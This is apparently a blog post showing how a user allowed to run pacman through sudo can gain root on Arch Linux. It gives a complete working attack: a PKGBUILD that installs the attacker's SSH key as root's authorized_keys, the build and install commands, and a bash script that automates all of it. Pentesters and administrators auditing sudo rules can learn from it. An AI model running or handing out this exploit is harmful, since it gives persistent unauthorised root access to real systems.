---
title: Privilege Escalation via Pacman
author: Saad
date: 2024-11-19 00:00:00 +0500
categories:
  - OS
  - Arch
tags:
  - privesc
  - pacman
  - arch
  - privilege escalation
  - pacman privesc
  - makepkg
  - malicious pkg
  - abusing pacman
  - root via pacman
image: pacman.jpg
media_subpath: /assets/img/pacman
---

Privilege escalation with `pacman`.
If the user has sudo permission to run `pacman`, we can easily escalate privileges to root.
```bash
[skid@arch]$ sudo -l 
User skid may run the following commands on arch:    
 (ALL : ALL) NOPASSWD: /usr/bin/pacman
```

First, create a directory and name it whatever you want:
```bash
[skid@arch]$ mkdir priv && cd priv
[skid@arch priv]$ nano PKGBUILD
```

In the `PKGBUILD` file, add the following content:
```bash
pkgname=privesc
pkgver=1.0
pkgrel=1
pkgdesc="Privilege escalation"
arch=('any')
url="http://example.com"
license=('GPL')
depends=()
makedepends=()
source=('authorized_keys')
sha256sums=('SKIP')
package() {
  install -Dm755 "$srcdir/authorized_keys" "$pkgdir/root/.ssh/authorized_keys"
}
```

Now, generate SSH keys on the target machine, and rename `id_rsa.pub` to `authorized_keys`:
```bash
[skid@arch]$ ssh-keygen -t rsa -b 4096 -f id_rsa -N "" 
```

```bash
[skid@arch]$ mv id_rsa.pub authorized_keys
```

> This malicious package script is designed to add our public SSH key to root's authorized_keys.

Next, run `makepkg` in the directory containing the `PKGBUILD` script:
```bash
[skid@arch priv]$ makepkg
```

After generating the package, transfer the `id_rsa` private key to your own machine and set its permissions to `600`:
```bash
[skid@arch] chmod 600 id_rsa
```

The `makepkg` command should produce a `.zst` file, such as `privesc-1.0-1-any.pkg.tar.zst`. Finally, install this package with `pacman`:
```bash
[skid@arch priv]$ sudo /usr/bin/pacman -U /home/skid/priv/privesc-1.0-1-any.pkg.tar.zst
```
This will add your SSH key to the root user's authorized_keys, allowing root access via SSH.

Just a bash script to do all the crap in snap.
```bash
#!/bin/bash

# Create a working directory
mkdir priv && cd priv

# Generate PKGBUILD file
cat <<EOF >PKGBUILD
pkgname=privesc
pkgver=1.0
pkgrel=1
pkgdesc="Privilege Escalation Package"
arch=('any')
url="http://example.com"
license=('GPL')
depends=()
makedepends=()
source=('authorized_keys')
sha256sums=('SKIP')
package() {
  install -Dm755 "\$srcdir/authorized_keys" "\$pkgdir/root/.ssh/authorized_keys"
}
EOF

# Generate SSH keys
ssh-keygen -t rsa -b 4096 -f id_rsa -N ""
mv id_rsa.pub authorized_keys

# Build the malicious package
makepkg

# Output message
echo "Malicious package created! Run the following command to deploy:"
echo "sudo pacman -U $(pwd)/privesc-1.0-1-any.pkg.tar.zst"
echo "Don't forget to secure your private key: id_rsa"

```